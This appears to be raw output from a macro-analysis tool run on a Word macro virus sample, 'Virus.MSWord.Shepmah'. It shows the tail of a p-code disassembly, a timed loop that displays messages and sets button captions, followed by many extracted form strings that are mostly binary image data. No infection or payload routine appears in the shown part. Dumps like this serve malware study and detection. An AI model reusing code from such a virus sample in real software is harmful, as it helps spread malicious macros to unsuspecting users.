' 	Ld teks4 
' 	Ld teks5 
' 	Ld teks6 
' 	Ld teks7 
' 	ArgsArray Array 0x0007 
' 	St mesej 
' Line #107:
' 	LitDI2 0x0000 
' 	St i 
' Line #108:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0006 
' 	For 
' Line #109:
' 	LitDI2 0x0007 
' 	St PauseTime 
' Line #110:
' 	Ld Timer 
' 	St Start 
' Line #111:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #112:
' 	ArgsCall DoEvents 0x0000 
' Line #113:
' 	Loop 
' Line #114:
' 	Ld i 
' 	ArgsLd mesej 0x0001 
' 	Ld Msg 
' 	MemSt Caption 
' Line #115:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	LitVarSpecial (True)
' 	Ld DingDang 
' 	MemSt Enabled 
' Line #117:
' 	LitVarSpecial (True)
' 	Ld Butang 
' 	MemSt Enabled 
' Line #118:
' 	LitStr 0x000F "Hampehs BetOI!!"
' 	Ld Butang 
' 	MemSt Caption 
' Line #119:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������罽޵����ޭ����Ɣ�筭������Δ����ޜ�������֔�便���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���甔���ބ��kk9!!����{{���J))�{{���Z11�kk{BB�ss�{{����cc�ZZ�ss���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B!!�RRs99!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kk�ss�{{�JJ�BB{99k11Z))�RR�ssJ!!�BB�JJ�kk�ZZ�99�kk�cc�BB�kkc))�RR�99R!!{11�RR�JJ)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cck))�BB�ZZ�11�JJB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z!!�BB�JJ�ZZ�BB�99�JJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c!!{))�BB�99�RR1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JJ�RR�99�JJk!!�BB�99�11�BBR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JJ�BB�11�))�99�BB�11Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{!!�99�BB�))�BB�99�))�11�99!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�99�!!�))�11k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�))�99�11J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�))�11�!!�11)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�11�!!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�))�!!�))�!!�))1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�))�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!�!!{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H���o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<{��j�[�����k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݺu�ā
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͛͢
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y{�$��4r�H�"'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-^����Ǐ��{�޵kǮ�Ku��iM����uU�Nm�,<z�ڭ�z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۈ>B�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�-��.+��ӡ;gn�ہ�Z��	�۸Ð
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``��$L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��p��y��-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?w.#tg��<y�ཫ����y�s���.�D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z��|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j��Z?mg�1�q�޹��.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���b��{��ߔ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��׎�M�	��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�[5e���sIn�7j�蓏;�XW�h��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<��#�;�ل�	04��;��BA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�X��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H A�Ă�>�lf�:�Գ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�5���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%����:�,4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�(U�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=��3�Np�(�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�H��AἔN�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S��j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pJ6��#O�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�=��ӥC���?[&��lE���4��W�;�l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dB�#)AJ$`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~��COr�45O;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HP4EjF�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z㯾m��;�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~�`�%;���N��8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>���V?�Ѓ���M;�؃
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�D3�l�#A�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�8	O����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZO[�ܣ0?��#�w�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'q�o?��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&>[��>�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��Î96�S�����[��c�>ݲ��8ؤ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�h��h����Z3�#�<i}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P!����VŸ�q<?�$M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��);��&A�`I�=H�ĕ:Z+���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�av�ZO*�:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-X�=�ŭN�
}S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��st�|GYyE��\s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�7��zk��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V9߀c�N�����$��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�)��!G#����>a��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�|6��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yC�9[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^�s�U]m��`��G��觯�����B��r�"w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<-�4���d��)�X�2~q�S�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6bQ@^(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2P��ֹ�5GZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����o�`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PJ���<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F0�9�9�a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qMYޠ!:���Y%+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�H@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��)���40N6�2�+��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�uhi�<�+!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��y�0���8*�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B��#��X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����h�fA��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�פM �1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s�#6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OxX��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�Z0Y�p�B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'{G����$��y��Oi.47��ci*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rԁ�z�G*���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�#CQ4�(�Ј��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�m@�z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڣ�k��[Y\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*���LԣM���8恳w��!�hҍ:Őr�$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�#<e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
ZhI
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'x�'�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�C_��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�A����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/��,o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�p�|R�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ϳ�i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Vb�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/\Î~$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<-���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�Øg�-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w,홉�	4�)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l(\�ɇK
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,D�i'��`�=�Վ�ci��Ƿ�1F�ȩ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ںz
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��[Ё
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H8��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Gx��;�e$<�
-------------------------------------------------------------------------------
